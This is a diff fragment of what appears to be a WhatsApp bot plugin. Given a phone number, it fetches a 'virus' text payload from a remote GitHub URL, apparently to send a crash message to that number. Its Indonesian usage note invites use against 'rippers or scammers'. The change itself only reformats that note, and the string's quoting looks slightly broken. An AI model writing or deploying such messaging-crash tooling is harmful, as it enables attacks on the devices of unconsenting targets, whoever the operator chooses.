@@ -4,7 +4,7 @@ import { sticker } from '../lib/sticker.js'
 
 const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\n*GUNAKAN UNTUK RIPPER ATAU SCAMER!*',
+	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGUNAKAN UNTUK RIPPER ATAU SCAMER!',
  `)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
